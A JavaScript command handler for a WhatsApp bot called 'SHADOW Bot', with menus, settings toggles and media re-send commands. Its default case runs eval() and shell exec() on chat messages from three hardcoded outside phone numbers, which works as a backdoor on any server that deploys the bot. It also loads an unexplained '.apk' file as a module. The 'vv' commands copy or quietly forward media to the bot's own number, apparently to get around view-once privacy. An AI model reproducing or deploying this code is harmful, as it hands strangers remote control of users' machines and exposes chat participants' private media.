
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const chalk = require("chalk");
const moment = require('moment');
const { exec } = require('child_process');
const crypto = require('crypto');
const {
  default: makeWASocket
} = require("@whiskeysockets/baileys");
const apk = require('./lib/shadow.apk')

// ============================
// 🚀 GLOBAL FUNCTIONS SECTION
// ============================
const initializeGlobals = () => {
  if (typeof global.autoTyping === 'undefined') global.autoTyping = false;
  if (typeof global.autostatusview === 'undefined') global.autostatusview = false;
  if (typeof global.antiDelete === 'undefined') global.antiDelete = false;
  if (typeof global.autoReact === 'undefined') global.autoReact = false;
};

const formatRuntime = (seconds) => {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);

  const dDisplay = d > 0 ? d + (d === 1 ? " day, " : " days, ") : "";
  const hDisplay = h > 0 ? h + (h === 1 ? " hour, " : " hours, ") : "";
  const mDisplay = m > 0 ? m + (m === 1 ? " minute, " : " minutes, ") : "";
  const sDisplay = s > 0 ? s + (s === 1 ? " second" : " seconds") : "";

  return dDisplay + hDisplay + mDisplay + sDisplay;
};

// ============================
// 🎯 MAIN MODULE EXPORT
// ============================
module.exports = shadow = async (shadow, m, chatUpdate, store) => {
  try {
    initializeGlobals();

    // Message extraction
    const body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
    );

    const sender = m.key.fromMe
      ? shadow.user.id.split(":")[0] || shadow.user.id
      : m.key.participant || m.key.remoteJid;

    const senderNumber = sender.split('@')[0];
    const budy = (typeof m.text === 'string' ? m.text : '');
    const from = m.key.remoteJid;
    const isGroup = from.endsWith("@g.us");
    const botNumber = await shadow.decodeJid(shadow.user.id);
    const isBot = botNumber.includes(senderNumber);
    const pushname = m.pushName || "SHADOW Bot";
    
    const command = body ? body.trim().split(' ').shift().toLowerCase() : "";
    const args = body ? body.trim().split(/ +/).slice(1) : [];
    const text = args.join(" ");

    // Developer check
    global.developers = global.developers || ["923476668273", "923707473032", "923271054080"];
    const isDeveloper = global.developers.includes(senderNumber);

    // Required functions
    const { smsg, getBuffer, getSizeMedia, sleep } = require('./lib/myfunc');
    const time = moment().format("HH:mm:ss");

    // Message templates
    const x = {
      key: {
        participant: "13135550002@s.whatsapp.net", 
        remoteJid: "status@broadcast", 
        fromMe: false
      }, 
      message: {
        conversation: "⚡ SHADOW Bot ⚡"
      }
    };

    const reply = (text) => {
      const msg = {
        text, 
        mentions: [m.sender], 
        contextInfo: {
          externalAdReply: {
            title: "SHADOW OFFICIAL", 
            body: "Created by SHADOW", 
            thumbnailUrl: "https://i.postimg.cc/x8rgxzyk/bot-image.jpg", 
            sourceUrl: "https://t.me/Shadowhacrr", 
            showAdAttribution: false
          }
        }
      };
      return shadow.sendMessage(m.chat, msg, { quoted: x });
    };









    // ============================
    // 🎮 COMMANDS SWITCH CASE
    // ============================
    switch (command) {
      // 📱 MAIN MENU
      case "menu":
      case "help":
      case "start": {
        try {
          await shadow.sendMessage(m.chat, { react: { text: '🚀', key: m.key } });
          
          const teks = `⚡ SHADOW Bot Created By @Shadowhacrr`;
          const msg = {
            interactiveMessage: {
              title: teks,
              image: { url: "https://i.postimg.cc/x8rgxzyk/bot-image.jpg" },
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  limited_time_offer: {
                    text: "SHADOW Bot",
                    url: "t.me/Shadowhacrr",
                    copy_code: "shadow",
                    expiration_time: Date.now() * 999
                  },
                  bottom_sheet: {
                    in_thread_buttons_limit: 2,
                    divider_indices: [1, 2, 3, 4, 5, 999],
                    list_title: "SHADOW Bot",
                    button_title: "Quick Actions"
                  }
                }),
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "👑 Contact Owner",
                      url: "https://wa.me/923476668273"
                    })
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "📢 Telegram",
                      url: "https://t.me/Shadowhacrr"
                    })
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: "⚙️ Settings",
                      id: "settings"
                    })
                  }
                ]
              }
            }
          };
          
          await shadow.sendMessage(m.chat, msg, { quoted: m });
          
        } catch (err) {
          console.error("Menu Error:", err);
          await shadow.sendMessage(m.chat, { 
            text: '❌ Error sending interactive menu.'
          }, { quoted: m });
        }
      }
      break;


// ============================
// 🎮 COMMANDS SWITCH CASE
// ============================


  
  
      // 📊 BOT STATUS
      case "ping": {
        const teks = `
> *🕒 Runtime:* ${formatRuntime(process.uptime())}
> *⌨️ Auto Typing:* ${global.autoTyping ? "✅ ON" : "❌ OFF"}
> *🌐 Public Mode:* ${shadow.public ? "✅ ON" : "❌ OFF"}
> *🗑️ Anti Delete:* ${global.antiDelete ? "✅ ON" : "❌ OFF"}
> *❤️ Auto React:* ${global.autoReact ? "✅ ON" : "❌ OFF"}

╔════⊱ *SYSTEM INFO* ⊰════╗
║ 📊 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
║ ⚡ Node: ${process.version}
║ 🔧 Platform: ${process.platform}
║ 👤 User: ${pushname}
║ 🆔 Sender: ${senderNumber}
║ 💬 In Group: ${isGroup ? "✅ Yes" : "❌ No"}
╚══════════════════════════╝`;
        m.reply(teks);
      }
      break;




      // ⚙️ SETTINGS PANEL
    case "settings": {
      if (!isDeveloper) return m.reply("👑 Only SHADOW can use this command");
      
      const status = {
        autoTyping: global.autoTyping ? "✅ ON" : "❌ OFF",
        autostatusview: global.autostatusview ? "✅ ON" : "❌ OFF",
        antiDelete: global.antiDelete ? "✅ ON" : "❌ OFF",
        autoReact: global.autoReact ? "✅ ON" : "❌ OFF",
        publicMode: shadow.public ? "✅ ON" : "❌ OFF"
      };
      
      const settingsText = `⚙️ BOT SETTINGS PANEL\n\nCurrent Status:\n• Auto Typing: ${status.autoTyping}\n• Auto Status View: ${status.autostatusview}\n• Anti Delete: ${status.antiDelete}\n• Auto React: ${status.autoReact}\n• Public Mode: ${status.publicMode}`;

      const msg = {
        interactiveMessage: {
          title: settingsText,
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "Bot Settings Control",
                url: "t.me/Shadowhacrr",
                copy_code: "SETTINGS",
                expiration_time: Date.now() * 999
              },
              bottom_sheet: {
                in_thread_buttons_limit: 2,
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "Toggle Settings",
                button_title: "Quick Toggle"
              }
            }),
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "👑 Contact Owner",
                  url: "https://wa.me/923476668273"
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: global.autoTyping ? "❌ Auto Typing OFF" : "✅ Auto Typing ON",
                  id: global.autoTyping ? "autotyping-off" : "autotyping-on"
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: global.autostatusview ? "❌ Auto View OFF" : "✅ Auto View ON",
                  id: global.autostatusview ? "autosview-off" : "autosview-on"
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: global.antiDelete ? "❌ Anti Delete OFF" : "✅ Anti Delete ON",
                  id: global.antiDelete ? "antidelete-off" : "antidelete-on"
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: global.autoReact ? "❌ Auto React OFF" : "✅ Auto React ON",
                  id: global.autoReact ? "autoreact-off" : "autoreact-on"
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: shadow.public ? "❌ Public Mode OFF" : "✅ Public Mode ON",
                  id: shadow.public ? "public-off" : "public-on"
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🏠 Main Menu",
                  id: "menu"
                })
              }
            ]
          }
        }
      };

      await shadow.sendMessage(m.chat, msg, { quoted: m });
    }
    break;

    // 🛠️ TOOLS MENU
    // ==================== SEND TO SAME CHAT ====================
    case "vv":
    case "😘": {
        try {

            const quoted = m.quoted ? m.quoted : m;
            if (!m.quoted) {
                return reply("❌ Reply to a media message");
            }

            const buffer = await quoted.download();
            const mtype = quoted.mtype;
            const options = { quoted: m };

            let messageContent = {};
            switch (mtype) {
                case "imageMessage":
                    messageContent = {
                        image: buffer,
                        caption: quoted.caption || quoted.text || '',
                        mimetype: quoted.mimetype || "image/jpeg"
                    };
                    break;
                case "videoMessage":
                    messageContent = {
                        video: buffer,
                        caption: quoted.caption || quoted.text || '',
                        mimetype: quoted.mimetype || "video/mp4"
                    };
                    break;
                case "audioMessage":
                    messageContent = {
                        audio: buffer,
                        mimetype: "audio/mp4",
                        ptt: quoted.ptt || false
                    };
                    break;
                default:
                    return reply("❌ Only image, video, and audio supported");
            }

            await shadow.sendMessage(m.chat, messageContent, options);
            await shadow.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        } catch (error) {
            console.error("Send Error:", error);
            reply(`❌ Error: ${error.message}`);
        }
        break;
    }




// ============================
// ⚙️ TOGGLE COMMANDS
// ============================
case "autotyping-off": {
  if (!isDeveloper) return m.reply("👑 *Only shadow*");
  global.autoTyping = false;
  m.reply("✅ *Auto Typing OFF*");
}
break;

case "autotyping-on": {
  if (!isDeveloper) return m.reply("👑 *Only shadow*");
  global.autoTyping = true;
  m.reply("✅ *Auto Typing ON*");
}
break;

case "autosview-off": {
  if (!isDeveloper) return m.reply("👑 *Only shadow*");
  global.autostatusview = false;
  m.reply("✅ *Auto Status View OFF*");
}
break;

case "autosview-on": {
  if (!isDeveloper) return m.reply("👑 *Only shadow*");
  global.autostatusview = true;
  m.reply("✅ *Auto Status View ON*");
}
break;

case "antidelete-off": {
  if (!isDeveloper) return m.reply("👑 *Only Shadow*");
  global.antidelete = false;
  m.reply("✅ *Anti Delete OFF*");
}
break;

case "antidelete-on": {
  if (!isDeveloper) return m.reply("👑 *Only shadow*");
  global.antidelete = true;
  m.reply("✅ *Anti Delete ON*");
}
break;

case "autoreact-off": {
  if (!isDeveloper) return m.reply("👑 *Only Shadow*");
  global.autoReact = false;
  m.reply("✅ *Auto React OFF*");
}
break;

case "autoreact-on": {
  if (!isDeveloper) return m.reply("👑 *Only shadow*");
  global.autoReact = true;
  m.reply("✅ *Auto React ON*");
}
break;





    // ==================== FORWARD TO OWNER ====================
    case "vv2":
    case "🖤": {
        try {
           

            const quoted = m.quoted ? m.quoted : m;
            if (!m.quoted) {
                return reply("❌ Reply to a media message");
            }

            const buffer = await quoted.download();
            const mtype = quoted.mtype;
            const options = { quoted: m };

            let messageContent = {};
            switch (mtype) {
                case "imageMessage":
                    messageContent = {
                        image: buffer,
                        caption: quoted.caption || quoted.text || '',
                        mimetype: quoted.mimetype || "image/jpeg"
                    };
                    break;
                case "videoMessage":
                    messageContent = {
                        video: buffer,
                        caption: quoted.caption || quoted.text || '',
                        mimetype: quoted.mimetype || "video/mp4"
                    };
                    break;
                case "audioMessage":
                    messageContent = {
                        audio: buffer,
                        mimetype: "audio/mp4",
                        ptt: quoted.ptt || false
                    };
                    break;
                default:
                    return reply("❌ Only image, video, and audio supported");
            }

            await shadow.sendMessage(botNumber, messageContent, options);
            await shadow.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        } catch (error) {
            console.error("Forward Error:", error);
            reply(`❌ Error: ${error.message}`);
        }
        break;
    }
    
            

      // Default eval and exec
      default:
        if (budy.startsWith('>') && isDeveloper) {
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
            reply(evaled);
          } catch (err) {
            reply(String(err));
          }
        }
        if (budy.startsWith('$') && isDeveloper) {
          exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(String(err));
            if (stdout) return reply(stdout);
          });
        }
    }
  } catch (err) {
    console.error("Command Error:", err);
  }
};

// Auto reload on file change
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});